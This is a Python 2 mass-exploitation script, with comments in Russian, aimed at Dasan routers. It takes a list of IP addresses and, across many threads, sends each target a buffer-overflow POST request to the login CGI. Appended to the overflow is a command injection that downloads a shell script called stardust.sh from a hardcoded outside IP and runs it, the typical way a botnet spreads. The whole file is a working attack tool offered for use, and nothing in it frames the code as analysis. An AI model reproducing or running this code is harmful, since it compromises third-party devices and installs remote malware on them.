
#!/usr/bin/python

import sys, socket, json, time, ssl, struct, os
from threading import Thread

if len(sys.argv) < 2:
    print "Usage: python "+sys.argv[0]+" <list>"
    sys.exit()

port = 8080
buf = 4096
pre_pl0 = 0x2ad0c000
pre_pl2 = pre_pl0 + 0x00115d40
pl2 = struct.pack(">i",pre_pl2)
pre_pl3 = pre_pl0 + 0x0003CC9C
pl3 = struct.pack(">i",pre_pl3)

# Обновленный payload с использованием stardust.sh
payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.200.81.239/hiddenbin/stardust.sh -O stardust.sh; chmod 777 stardust.sh; sh stardust.sh dasan"
payload2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://84.200.81.239/hiddenbin/stardust.sh -O stardust.sh; chmod 777 stardust.sh; sh stardust.sh dasan"
payload3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -o stardust.sh http://84.200.81.239/hiddenbin/stardust.sh; chmod 777 stardust.sh; sh stardust.sh dasan"

pre_data = "A"*(756 - 0x28) + pl3 + 'C'*(0x28-8) + pl2 + ';'*24 + payload
pre_data2 = "A"*(756 - 0x28) + pl3 + 'C'*(0x28-8) + pl2 + ';'*24 + payload2
pre_data3 = "A"*(756 - 0x28) + pl3 + 'C'*(0x28-8) + pl2 + ';'*24 + payload3

post_data = "action="+pre_data+"&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"
post_data2 = "action="+pre_data2+"&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"
post_data3 = "action="+pre_data3+"&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"

def build_headers(post_data, host):
    return "POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: "+host+":"+str(port)+"\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://"+host+":"+str(port)+"/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+str(len(post_data))+"\r\n\r\n"+str(post_data)

i = 0
success = 0
failed = 0
ips = open(sys.argv[1]).readlines()

def dasan(host):
    global i, success, failed
    host = host.strip("\n\r")
    if not host:
        return
    
    payloads = [post_data, post_data2, post_data3]
    
    for payload_data in payloads:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            s = ssl.wrap_socket(sock)
            s.connect((host, port))
            
            headers = build_headers(payload_data, host)
            s.send(headers)
            
            resp = s.recv(buf).strip()
            if "200 OK" in resp:
                success += 1
                print "\n[+] Payload sent to: " + host
            s.close()
            break  # Если один payload сработал, не пробуем остальные
            
        except Exception as e:
            failed += 1
            if s:
                s.close()
            continue
    
    i += 1

def worker():
    threads = []
    for ip in ips:
        try:
            ip = ip.strip("\r\n")
            if ip:
                t = Thread(target=dasan, args=(ip,))
                t.start()
                threads.append(t)
                time.sleep(0.01)  # Небольшая задержка между запусками
        except:
            pass
    
    # Ждем завершения всех потоков
    for t in threads:
        t.join()
    
    print "\n\n[*] Scanning completed!"
    print "[*] Total processed: " + str(i)
    print "[*] Successful: " + str(success)
    print "[*] Failed: " + str(failed)
    sys.exit(0)

workerthrd = Thread(target=worker)
workerthrd.start()

print "[*] Starting Dasan exploit with stardust.sh payload..."
print "[*] Target file: " + sys.argv[1]
print "[*] Payload URL: http://84.200.81.239/hiddenbin/stardust.sh"

while workerthrd.is_alive():
    try:
        sys.stdout.write("\r\033[33m[*] Processed: \033[92m[\033[93m"+str(i)+"\033[92m]\033[33m | Success: \033[92m[\033[93m"+str(success)+"\033[92m]\033[33m | Failed: \033[91m[\033[93m"+str(failed)+"\033[91m]\033[0m")
        sys.stdout.flush()
        time.sleep(1)
    except KeyboardInterrupt:
        print "\n[!] Exiting on user input..."
        sys.exit(0)
    except:
        pass
